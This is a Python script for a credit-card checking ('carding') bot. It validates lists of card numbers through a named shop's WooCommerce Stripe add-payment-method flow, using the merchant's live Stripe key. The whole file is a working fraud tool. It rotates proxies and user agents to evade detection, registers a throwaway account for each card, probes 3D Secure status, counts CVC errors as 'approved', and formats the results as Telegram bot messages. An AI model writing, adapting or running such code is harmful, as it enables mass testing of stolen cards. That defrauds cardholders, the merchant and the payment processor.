import requests
import os
import re
import random
import string
import time
import json
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers for Stripe request
stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

def get_rotating_user_agent():
    """Generate different types of user agents"""
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def generate_random_email():
    """Generate random email for each account"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }
    else:
        # If no auth, use without credentials
        ip, port = parts[0], parts[1]
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def create_new_account(session, proxy_str):
    """Create a new account for each card with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        # Step 1: Get login nonce
        login_page_res = session.get('https://firstcornershop.com/my-account/', proxies=proxies, timeout=30)
        
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return False, "Failed to get login nonce"
        login_nonce = login_nonce_match.group(1)

        # Step 2: Register a new account with random email ONLY
        random_email = generate_random_email()
        
        register_data = {
            'email': random_email, 
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/my-account/', 
            'register': 'Register',
        }
        
        reg_response = session.post('https://firstcornershop.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
        
        # Check if registration was successful
        if reg_response.status_code in [302, 303]:
            return True, "Account created"
        else:
            return True, "Account might be created"
            
    except Exception as e:
        return False, f"Account error: {str(e)}"

def get_payment_nonce(session, proxy_str):
    """Get payment nonce from the payment method page with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        payment_page_res = session.get('https://firstcornershop.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return None, "Failed to get payment nonce"
        
        ajax_nonce = payment_nonce_match.group(1)
        return ajax_nonce, "Success"
    except Exception as e:
        return None, f"Payment nonce error: {str(e)}"

def get_3ds_challenge_mandated(website_response, proxy_str):
    """Extract acsChallengeMandated value from 3DS authentication response - EXACT RESPONSE ONLY"""
    try:
        if not website_response.get('success'):
            return 'ACSFAILED'
            
        data_section = website_response.get('data', {})
        if data_section.get('status') != 'requires_action':
            return 'ACSFAILED'
            
        # Extract 3DS source directly from the website response
        next_action = data_section.get('next_action', {})
        if next_action.get('type') == 'use_stripe_sdk':
            use_stripe_sdk = next_action.get('use_stripe_sdk', {})
            three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
            
            if three_d_secure_2_source:
                proxies = parse_proxy(proxy_str)
                headers = stripe_headers.copy()
                headers['user-agent'] = get_rotating_user_agent()
                
                # Call 3DS authenticate endpoint
                auth_data = {
                    'source': three_d_secure_2_source,
                    'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
                    'one_click_authn_device_support[hosted]': 'false',
                    'one_click_authn_device_support[same_origin_frame]': 'false',
                    'one_click_authn_device_support[spc_eligible]': 'true',
                    'one_click_authn_device_support[webauthn_eligible]': 'true',
                    'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                    'key': 'pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ',
                    '_stripe_version': '2024-06-20'
                }
                
                auth_response = requests.post(
                    'https://api.stripe.com/v1/3ds2/authenticate',
                    headers=headers,
                    data=auth_data,
                    proxies=proxies,
                    timeout=30
                )
                
                if auth_response.status_code == 200:
                    auth_data_response = auth_response.json()
                    ares = auth_data_response.get('ares', {})
                    acs_challenge = ares.get('acsChallengeMandated')
                    
                    # Return exact value from response, no auto N
                    if acs_challenge in ['Y', 'N']:
                        return acs_challenge
                    else:
                        return 'ACSFAILED'
                else:
                    return 'ACSFAILED'
        
        return 'ACSFAILED'
        
    except Exception as e:
        return 'ACSFAILED'
        
def get_final_message(website_response, proxy_str):
    """Extract final user-friendly message from response with 3DS info"""
    try:
        if website_response.get('success'):
            data_section = website_response.get('data', {})
            status = data_section.get('status', '')
            
            if status == 'succeeded':
                return "Payment method successfully added."
            elif status == 'requires_action':
                # Get 3DS challenge mandated info directly from website response
                acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
                return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
            else:
                return "Payment method status unknown."
        else:
            # Extract error message
            error_data = website_response.get('data', {})
            if 'error' in error_data:
                error_msg = error_data['error'].get('message', 'Declined')
                # Simplify common error messages
                if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                    return "Your card's security code is incorrect."
                elif 'declined' in error_msg.lower():
                    return "Your card was declined."
                elif 'insufficient' in error_msg.lower():
                    return "Your card has insufficient funds."
                elif 'expired' in error_msg.lower():
                    return "Your card has expired."
                else:
                    return error_msg
            else:
                return "Card declined."
    except:
        return "Unknown response"

# BIN lookup function - USING BINLIST.NET API
def get_bin_info(card_number):
    """Get BIN information using binlist.net API"""
    if not card_number or len(card_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    # Use first 6 digits (standard BIN length) - CLEAN THE CARD NUMBER
    clean_card = ''.join(filter(str.isdigit, card_number))
    bin_code = clean_card[:6]
    
    try:
        # Small delay for BIN API
        time.sleep(0.5)
        
        headers = {
            'User-Agent': get_rotating_user_agent(),
            'Accept': 'application/json'
        }
        
        # Using binlist.net API - more reliable
        api_url = f"https://lookup.binlist.net/{bin_code}"
        
        response = requests.get(api_url, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            
            # Parse binlist.net response format
            bank_name = data.get('bank', {}).get('name', 'Unavailable')
            country_name = data.get('country', {}).get('name', 'Unknown')
            brand = data.get('scheme', 'Unknown')
            card_type = data.get('type', 'Unknown')
            country_code = data.get('country', {}).get('alpha2', '')
            
            # For level, we'll use brand since binlist doesn't provide level
            level = brand
            
            return {
                'bank': bank_name if bank_name else 'Unavailable',
                'country': country_name if country_name else 'Unknown',
                'brand': brand if brand else 'Unknown',
                'type': card_type if card_type else 'Unknown',
                'level': level if level else 'Unknown',
                'emoji': get_country_emoji(country_code)
            }
        
        # If API call failed, return default values
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
        
    except Exception:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        # Convert to uppercase and get emoji
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'
        
def check_card_stripe(cc_line):
    """Main function to check card via Stripe (single card)"""
    start_time = time.time()
    
    try:
        # Parse CC
        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy
        
        # Load proxies
        proxies_list = load_proxies()
        if not proxies_list:
            return "❌ No proxies available"
        
        # Use random proxy
        proxy_str = random.choice(proxies_list)
        
        session = requests.Session()
        session.headers.update({
            'user-agent': get_rotating_user_agent()
        })

        if len(yy) == 4:
            yy_stripe = yy[-2:]
        else:
            yy_stripe = yy

        # Create a NEW account for this card
        account_created, account_msg = create_new_account(session, proxy_str)
        if not account_created:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Get payment nonce
        ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
        if not ajax_nonce:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Prepare Stripe data with the current card
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=ZW&payment_user_agent=stripe.js%2F53a74093af%3B+stripe-js-v3%2F53a74093af%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffirstcornershop.com&time_on_page=105133&client_attribution_metadata[client_session_id]=7bc29799-34f4-43ec-97ed-7c847b3ba363&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=290781b5-8373-4375-976f-8c2fd50403b0&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=aaf5afa0-fe5c-4bd0-a003-2aa9130a03079dd6fb&muid=59c21fbb-a6c5-4dca-a7f0-75860ac68588146bf7&sid=e4a7361c-0155-4213-bc46-ed9831c9ce0282806c&key=pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ&_stripe_version=2024-06-20'

        proxies = parse_proxy(proxy_str)
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, proxies=proxies, timeout=30)

        # Check if response has 'id' before extracting
        response_data = response.json()
        
        if 'id' in response_data:
            pm_id = response_data['id']
            
            # Second request (admin ajax)
            headers2 = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://firstcornershop.com',
                'priority': 'u=1, i',
                'referer': 'https://firstcornershop.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': get_rotating_user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            data2 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }

            response2 = session.post('https://firstcornershop.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers2, data=data2, proxies=proxies, timeout=30)
            website_response = response2.json()
            
            # Get final message with 3DS info
            final_message = get_final_message(website_response, proxy_str)
            
            elapsed_time = time.time() - start_time
            # Get BIN info using new binlist.net API
            bin_info = get_bin_info(n)
            
            # Check the actual status from the response
            if website_response.get('success'):
                data_section = website_response.get('data', {})
                status = data_section.get('status', '')
                
                if status == 'succeeded':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                elif status == 'requires_action':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                # Check for specific error messages that should be treated as APPROVED
                error_data = website_response.get('data', {})
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', '').lower()
                    
                    # Treat these errors as APPROVED
                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
                        return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
        else:
            elapsed_time = time.time() - start_time
            # Get BIN info using new binlist.net API
            bin_info = get_bin_info(n)
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe validation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_stripe(cc_line)
        results.append(result)
        time.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Test with a single card
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
